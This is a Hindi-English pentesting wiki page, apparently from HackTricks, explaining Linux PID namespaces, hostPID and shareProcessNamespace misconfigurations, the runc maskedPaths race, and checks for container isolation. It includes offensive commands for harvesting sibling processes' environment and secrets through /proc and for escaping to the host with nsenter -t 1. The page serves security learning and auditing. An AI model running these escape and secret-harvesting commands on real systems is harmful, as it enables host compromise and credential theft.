# PID Namespace

{{#include ../../../../../banners/hacktricks-training.md}}

## Overview

PID namespace यह नियंत्रित करता है कि processes को कैसे number किया जाता है और कौन से processes दिखाई देते हैं। यही कारण है कि कोई container अपना PID 1 रख सकता है, भले ही वह कोई वास्तविक machine न हो। Namespace के अंदर workload को एक local process tree दिखाई देता है। Namespace के बाहर host को वास्तविक host PIDs और पूरा process landscape दिखाई देता है।<sup>[[3]](#references)</sup>

Security के दृष्टिकोण से, PID namespace महत्वपूर्ण है क्योंकि process visibility मूल्यवान होती है। जब कोई workload host processes को देख सकता है, तो वह service names, command-line arguments, process arguments में दिए गए secrets, `/proc` के माध्यम से environment-derived state और संभावित namespace-entry targets को observe कर सकता है। यदि वह केवल उन processes को देखने से आगे जाकर, जैसे सही conditions में signals भेजने या ptrace का उपयोग करने में सक्षम हो, तो समस्या कहीं अधिक गंभीर हो जाती है।

## Operation

एक नया PID namespace अपनी internal process numbering के साथ शुरू होता है। उसके अंदर बनाया गया पहला process, namespace के दृष्टिकोण से PID 1 बन जाता है। इसका अर्थ यह भी है कि orphaned children और signal behavior के लिए उसे विशेष init-like semantics मिलती हैं। इससे init processes, zombie reaping और containers में कभी-कभी इस्तेमाल किए जाने वाले छोटे init wrappers से जुड़ी कई container oddities स्पष्ट होती हैं।<sup>[[3]](#references)</sup>

PID namespaces एक hierarchy बनाते हैं। किसी ancestor namespace का process, उस ancestor में assigned PID का उपयोग करके descendants को address कर सकता है, लेकिन descendant ordinary PID-based syscalls के माध्यम से ancestor-only tasks को address नहीं कर सकता और न ही `setns()` के जरिए ऊपर जाकर किसी ancestor PID namespace में प्रवेश कर सकता है। Descendant के लिए जानबूझकर expose किया गया ancestor-owned procfs, ancestor का process view leak कर सकता है। साथ ही, `setns()` के जरिए किसी PID namespace में शामिल होने से caller स्वयं नहीं, बल्कि **future children** के लिए namespace बदलता है; इसलिए tools join करने के बाद fork करते हैं। Procfs mount उस process का PID view बनाए रखता है जिसने उसे mount किया था। इसी कारण `unshare(CLONE_NEWPID)` के बाद fresh procfs बनाना केवल cosmetic नहीं, बल्कि security के लिए महत्वपूर्ण है।<sup>[[3]](#references)</sup>

महत्वपूर्ण security lesson यह है कि कोई process isolated दिखाई दे सकता है क्योंकि उसे केवल अपना PID tree दिखता है, लेकिन उस isolation को जानबूझकर हटाया जा सकता है। Docker इसे `--pid=host` के माध्यम से expose करता है, जबकि Kubernetes इसे `hostPID: true` के माध्यम से करता है। जब container host PID namespace में शामिल हो जाता है, तो workload सीधे host processes को देखता है और बाद के कई attack paths कहीं अधिक वास्तविक हो जाते हैं।

## Lab

PID namespace manually बनाने के लिए:
```bash
sudo unshare --pid --fork --mount-proc bash
ps -ef
echo $$
```
अब shell को processes का एक private view दिखाई देता है। `--mount-proc` flag महत्वपूर्ण है क्योंकि यह एक ऐसा procfs instance mount करता है जो नए PID namespace से मेल खाता है, जिससे अंदर से process list coherent रहती है।<sup>[[3]](#references)</sup>

container behavior की तुलना करने के लिए:
```bash
docker run --rm debian:stable-slim ps -ef
docker run --rm --pid=host debian:stable-slim ps -ef | head
```
यह अंतर तुरंत और आसानी से समझ में आता है, इसलिए यह readers के लिए पहला lab बनाने के लिए अच्छा है।

## Runtime Usage

Docker, Podman, containerd और CRI-O में सामान्य containers को अपना PID namespace मिलता है। Kubernetes containers में सामान्यतः अलग-अलग PID views होते हैं; `shareProcessNamespace: true` जानबूझकर पूरे Pod के लिए एक view बनाता है।<sup>[[4]](#references)</sup> इसके विपरीत, `hostPID: true` node के PID namespace को चुनता है। LXC/Incus environments इसी kernel primitive पर निर्भर करते हैं, हालांकि system-container use cases अधिक जटिल process trees दिखा सकते हैं और अधिक debugging shortcuts को बढ़ावा दे सकते हैं।

वही नियम हर जगह लागू होता है: यदि runtime ने PID namespace को isolate नहीं करने का विकल्प चुना है, तो यह container boundary में जानबूझकर की गई कमी है।

## Misconfigurations

Canonical misconfiguration host PID sharing है। Teams अक्सर debugging, monitoring या service-management की सुविधा के लिए इसे उचित ठहराती हैं, लेकिन इसे हमेशा एक महत्वपूर्ण security exception माना जाना चाहिए। भले ही container के पास host processes पर तत्काल write primitive न हो, केवल visibility ही system के बारे में बहुत कुछ उजागर कर सकती है। `CAP_SYS_PTRACE` जैसी capabilities या उपयोगी procfs access जोड़ दिए जाने पर risk काफी बढ़ जाता है।

एक अन्य गलती यह मानना है कि चूंकि workload डिफ़ॉल्ट रूप से host processes को kill या ptrace नहीं कर सकता, इसलिए host PID sharing harmless है। यह निष्कर्ष enumeration के महत्व, namespace-entry targets की उपलब्धता और अन्य कमजोर controls के साथ PID visibility के संयोजन को नज़रअंदाज़ करता है।

### Kubernetes Pod-wide process sharing

`shareProcessNamespace: true`, `hostPID` से अलग है: यह node processes के बजाय **उसी Pod के अन्य containers** के processes को expose करता है। इसके बाद compromised sidecar या debug container, procfs access checks के अधीन, sibling command lines और environment data को enumerate कर सकता है, credentials इसकी अनुमति दें तो signals भेज सकता है, और `/proc/<pid>/root` के माध्यम से sibling के filesystem को traverse कर सकता है। Kubernetes स्पष्ट रूप से चेतावनी देता है कि command-line/environment secrets और container filesystems तब केवल लागू Unix permissions द्वारा protected होते हैं।<sup>[[4]](#references)</sup>

उपयोगी cluster-side review:
```bash
kubectl get pods -A -o json | jq -r '
.items[] |
select(.spec.hostPID == true or .spec.shareProcessNamespace == true) |
[.metadata.namespace,.metadata.name,
(.spec.hostPID // false),(.spec.shareProcessNamespace // false)] | @tsv'
```
Pod-wide PID namespace में compromised container से, visibility का अर्थ readability मानने के बजाय पहले वास्तविक access का परीक्षण करें:<sup>[[4]](#references)</sup>
```bash
victim=$(ps -eo pid,args | awk '/[n]ginx|[j]ava|[p]ython/{print $1; exit}')
[ -n "$victim" ] || { echo "No candidate process found"; exit 1; }
tr '\0' ' ' < "/proc/$victim/cmdline" 2>/dev/null; echo
tr '\0' '\n' < "/proc/$victim/environ" 2>/dev/null | sed -n '1,20p'
find "/proc/$victim/root/run/secrets" -maxdepth 2 -type f -ls 2>/dev/null
```
## दुरुपयोग

यदि host PID namespace साझा किया गया है, तो attacker host processes का निरीक्षण कर सकता है, process arguments को harvest कर सकता है, interesting services की पहचान कर सकता है, `nsenter` के लिए candidate PIDs ढूँढ सकता है, या process visibility को ptrace-related privilege के साथ मिलाकर host या neighboring workloads में हस्तक्षेप कर सकता है। कुछ मामलों में, केवल सही लंबे समय से चल रही process को देख पाना ही attack plan के बाकी हिस्से को नया रूप देने के लिए पर्याप्त होता है।

पहला practical step हमेशा यह पुष्टि करना होता है कि host processes वास्तव में दिखाई दे रहे हैं:
```bash
readlink /proc/self/ns/pid
ps -ef | head -n 50
ls /proc | grep '^[0-9]' | head -n 20
```
एक बार host PIDs दिखाई देने लगें, तो process arguments और namespace-entry targets अक्सर जानकारी के सबसे उपयोगी स्रोत बन जाते हैं:
```bash
for p in 1 $(pgrep -n systemd 2>/dev/null) $(pgrep -n dockerd 2>/dev/null); do
echo "PID=$p"
tr '\0' ' ' < /proc/$p/cmdline 2>/dev/null; echo
done
```
यदि `nsenter` उपलब्ध है और पर्याप्त privilege मौजूद है, तो जाँचें कि क्या किसी visible host process का उपयोग namespace bridge के रूप में किया जा सकता है:
```bash
which nsenter
nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "nsenter blocked"
```
प्रवेश अवरुद्ध होने पर भी, host PID sharing पहले से ही उपयोगी है क्योंकि यह service layout, runtime components और आगे target करने के लिए संभावित privileged processes को प्रकट करता है। केवल PID visibility से signal भेजने, trace करने, संवेदनशील `/proc/<pid>` entries पढ़ने या target के अन्य namespaces में शामिल होने की अनुमति **नहीं** मिलती; credentials, target namespace के owning user namespace में capabilities, Yama/LSM policy और seccomp अभी भी महत्वपूर्ण हैं।<sup>[[3]](#references)</sup> Process-injection examples के लिए [CAP_SYS_PTRACE](../../../../interesting-files-permissions/linux-capabilities.md#cap_sys_ptrace) देखें।

Host PID visibility file-descriptor abuse को भी अधिक वास्तविक बनाती है। यदि किसी privileged host process या neighboring workload के पास कोई संवेदनशील file या socket खुला है, तो attacker ptrace-style checks, ownership, procfs mount options, object type और target service model के आधार पर `/proc/<pid>/fd/` का निरीक्षण करके underlying object तक पहुंचने में सक्षम हो सकता है। केवल FD symlink दिखाई देने का अर्थ यह नहीं है कि उसे खोला जा सकता है, और socket को केवल उसके `/proc/<pid>/fd/N` symlink को खोलकर duplicate नहीं किया जा सकता। अलग `pidfd_getfd()` primitive और इसके authorization checks के लिए [Linux ptrace exit-race pidfd FD theft](../../../../main-system-information/kernel-lpe-cves/linux-ptrace-exit-race-pidfd_getfd-fd-theft.md) देखें।<sup>[[3]](#references)</sup>
```bash
for fd_dir in /proc/[0-9]*/fd; do
ls -l "$fd_dir" 2>/dev/null | sed "s|^|$fd_dir -> |"
done
grep " /proc " /proc/mounts
```
इन commands से यह पता लगाना उपयोगी होता है कि `hidepid=1` या `hidepid=2` cross-process visibility को कम कर रहा है या नहीं, और क्या open secret files, logs या Unix sockets जैसे स्पष्ट रूप से रुचिकर descriptors बिल्कुल दिखाई दे रहे हैं।

### पूर्ण उदाहरण: host PID + `nsenter`

जब process के पास host namespaces में join करने के लिए पर्याप्त privilege भी हो, तो Host PID sharing एक direct host escape बन जाती है:
```bash
ps -ef | head -n 50
capsh --print | grep cap_sys_admin
nsenter -t 1 -m -u -n -i -p /bin/bash
```
यदि command सफल होता है, तो container process अब host के mount, UTS, network, IPC और PID namespaces में execute हो रही है। इसका प्रभाव तत्काल host compromise होता है।

`nsenter` स्वयं मौजूद न होने पर भी, यदि host filesystem mounted है, तो host binary के माध्यम से यही परिणाम प्राप्त किया जा सकता है:
```bash
/host/usr/bin/nsenter -t 1 -m -u -n -i -p /host/bin/bash 2>/dev/null
```
### हालिया Runtime Notes

कुछ PID-namespace-relevant attacks पारंपरिक `hostPID: true` misconfigurations नहीं होते, बल्कि container setup के दौरान procfs protections लागू करने के तरीके से संबंधित runtime implementation bugs होते हैं।

#### `maskedPaths` race to host procfs

vulnerable `runc` versions में, container image या `runc exec` workload को control करने वाले attackers, container-side `/dev/null` को `/proc/sys/kernel/core_pattern` जैसे sensitive procfs path के symlink से replace करके masking phase में race कर सकते थे। यदि race सफल होती, तो masked-path bind mount गलत target पर लग सकता था और नए container के सामने host-global procfs knobs expose हो सकते थे।<sup>[[1]](#references)</sup>

Useful review command:
```bash
jq '.linux.maskedPaths' config.json 2>/dev/null
```
यह महत्वपूर्ण है क्योंकि अंतिम प्रभाव direct procfs exposure जैसा ही हो सकता है: writable `core_pattern` या `sysrq-trigger`, जिसके बाद host code execution या denial of service हो सकता है। समर्पित [masked paths](../masked-paths.md) और [sensitive host mounts](../../sensitive-host-mounts.md) pages सामान्य procfs attack surface को यहाँ दोहराए बिना कवर करते हैं।

#### `insject` के साथ Namespace injection

`insject` जैसे Namespace injection tools दिखाते हैं कि PID-namespace interaction के लिए process creation से पहले target namespace में प्रवेश करना हमेशा आवश्यक नहीं होता। कोई helper बाद में attach कर सकता है, `setns()` का उपयोग कर सकता है और target PID space में visibility बनाए रखते हुए execute कर सकता है:<sup>[[2]](#references)</sup>
```bash
sudo insject -S -p $(pidof containerd-shim) -- bash -lc 'readlink /proc/self/ns/pid && ps -ef'
```
इस तरह की technique मुख्य रूप से advanced debugging, offensive tooling और post-exploitation workflows के लिए महत्वपूर्ण होती है, जहाँ runtime द्वारा workload को initialize किए जाने के बाद namespace context से जुड़ना आवश्यक होता है।

### Related FD Abuse Patterns

जब host PIDs दिखाई दे रहे हों, तो दो patterns का स्पष्ट रूप से उल्लेख करना उचित है। पहला, कोई privileged process किसी sensitive file descriptor को `execve()` के दौरान खुला रख सकता है, क्योंकि उसे `O_CLOEXEC` के रूप में mark नहीं किया गया था। दूसरा, services `SCM_RIGHTS` के माध्यम से Unix sockets पर file descriptors भेज सकती हैं। दोनों मामलों में महत्वपूर्ण object अब pathname नहीं, बल्कि पहले से खुला हुआ handle होता है, जिसे lower-privilege process inherit या receive कर सकता है।

Container work में यह महत्वपूर्ण है, क्योंकि handle `docker.sock`, किसी privileged log, host secret file या किसी अन्य high-value object की ओर point कर सकता है, भले ही path स्वयं container filesystem से सीधे reachable न हो।

## Checks

इन commands का उद्देश्य यह निर्धारित करना है कि process के पास private PID view है या वह पहले से कहीं व्यापक process landscape को enumerate कर सकता है।
```bash
readlink /proc/self/ns/{pid,pid_for_children,user,mnt}
grep -E '^(Name|Pid|PPid|NSpid|Uid|Gid|TracerPid):' /proc/self/status
ps -ef | head
findmnt -no TARGET,FSTYPE,OPTIONS /proc
cat /proc/sys/kernel/yama/ptrace_scope 2>/dev/null
capsh --print 2>/dev/null | grep -E 'Current:|Bounding'
```
यहाँ क्या interesting है:<sup>[[3]](#references)</sup>

- यदि process list में स्पष्ट host services दिखाई देती हैं, तो संभवतः host PID sharing पहले से प्रभावी है।
- केवल एक छोटा container-local tree दिखाई देना सामान्य baseline है; `systemd`, `dockerd`, या असंबंधित daemons दिखाई देना सामान्य नहीं है।
- `NSpid` nested namespaces में PID mapping को उजागर कर सकता है। सबसे बाईं value procfs mount से जुड़े PID namespace के सापेक्ष होती है, जिसके बाद क्रमशः nested namespaces की values आती हैं।
- `readlink /proc/self/ns/pid` अकेले `hostPID` सिद्ध नहीं कर सकता: isolated container में भी एक valid PID-namespace inode होता है। इसे process list, procfs mount, runtime configuration और उपलब्ध होने पर host-side namespace inode के साथ correlate करें।
- एक बार host PIDs दिखाई देने लगें, तो केवल read-only process information भी उपयोगी reconnaissance बन जाती है।

यदि आपको ऐसा container मिलता है जो host PID sharing के साथ चल रहा है, तो इसे केवल cosmetic difference न समझें। यह workload द्वारा देखी और संभावित रूप से प्रभावित की जा सकने वाली चीज़ों में एक बड़ा बदलाव है।



## References

- [1] [runc security advisory: "masked path" abuse के कारण mount race conditions के माध्यम से container escape (CVE-2025-31133)](https://github.com/opencontainers/runc/security/advisories/GHSA-9493-h29p-rfm2)
- [2] [Tool Release – insject: एक Linux Namespace Injector](https://www.nccgroup.com/research-blog/tool-release-insject-a-linux-namespace-injector/)
- [3] [Linux man-pages 6.19 book](https://www.kernel.org/pub/linux/docs/man-pages/book/man-pages-6.19.pdf)
- [4] [एक Pod में Containers के बीच Process Namespace share करें](https://kubernetes.io/docs/tasks/configure-pod-container/share-process-namespace/)
{{#include ../../../../../banners/hacktricks-training.md}}
